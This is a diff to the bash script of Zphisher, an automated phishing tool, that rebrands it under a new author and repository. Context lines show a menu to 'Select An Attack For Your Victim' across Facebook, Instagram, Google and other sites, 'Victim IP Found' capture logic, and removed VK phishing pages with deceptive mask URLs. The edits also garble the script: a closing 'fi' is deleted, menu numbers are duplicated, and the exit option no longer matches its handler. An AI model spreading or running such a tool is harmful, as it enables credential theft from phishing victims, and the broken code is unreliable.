@@ -1,9 +1,9 @@
 #!/bin/bash
 
 ##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	TAHMID RAYAT 
+##   Author 	: 	MR TAN
 ##   Version 	: 	2.3.5
-##   Github 	: 	https://github.com/htr-tech/zphisher
+##   Github 	: 	https://github.com/Tan-vai/GET-IP
 
 
 ##                   GNU GENERAL PUBLIC LICENSE
@@ -97,7 +97,7 @@ HOST='127.0.0.1'
 PORT='8080' 
 
 ## ANSI colors (FG & BG)
-RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
+RED="$(printf '\033[31m')"  GREEN="$(printf '\x1b[38;5;48m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
 MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
 REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
 MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
@@ -203,13 +203,8 @@ check_status() {
 ## Banner
 banner() {
 	cat <<- EOF
-		${ORANGE}
-		${ORANGE} ____  ____ 
-		${ORANGE}(_  _)(  _ \  
-		${ORANGE}_)(_  )___/
-		${ORANGE}  (____)(__)  
-		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : ${__version__}
+		${ORANGE}  █ █▀█ ▄▄ █▀▀ █▀▀ ▀█▀                  
+		${ORANGE}  █ █▀▀ ░░ █▄█ ██▄ ░█░   ${CYAN}Version {RED}:{YELLOW}${__version__}
 
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by TAN × RIKTA ${WHITE}
 	EOF
@@ -218,11 +213,8 @@ banner() {
 ## Small Banner
 banner_small() {
 	cat <<- EOF
-		${BLUE}
-		${BLUE}  ____  ____ 
-		${BLUE}  (_  _)(  _ \
-		${BLUE}  _)(_  )___/
-        ${BLUE}(____)(__)  ${WHITE} ${__version__}
+		${GREEN} █ █▀█ ▄▄ █▀▀ █▀▀ ▀█▀
+        ${GREEN} █ █▀▀ ░░ █▄█ ██▄ ░█░ ${YELLOW} ${__version__}
 	EOF
 }
 
@@ -362,13 +354,13 @@ about() {
 		  KasRoudra, E343IO, sepp0, ThelinuxChoice,
 		  Yisus7u7
 
-		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
+		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}05${RED}]${ORANGE} Exit
 
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 	case $REPLY in 
-		99)
+		5)
 			msg_exit;;
 		0 | 00)
 			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
@@ -426,7 +418,6 @@ capture_data() {
 			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
 			capture_ip
 			rm -rf .server/www/ip.txt
-		fi
 		
 	done
 }
@@ -690,30 +681,7 @@ site_gmail() {
 }
 
 ## Vk
-site_vk() {
-	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
-
-	EOF
-
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
-
-	case $REPLY in 
-		1 | 01)
-			website="vk"
-			mask='https://vk-premium-real-method-2020'
-			tunnel_menu;;
-		2 | 02)
-			website="vk_poll"
-			mask='https://vote-for-the-best-social-media'
-			tunnel_menu;;
-		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-			{ sleep 1; clear; banner_small; site_vk; };;
-	esac
-}
 
 ## Menu
 main_menu() {
@@ -721,9 +689,9 @@ main_menu() {
 	cat <<- EOF
 		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
-		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
-		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
+		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}5${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
+		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}5${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
+		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}6${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
 
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
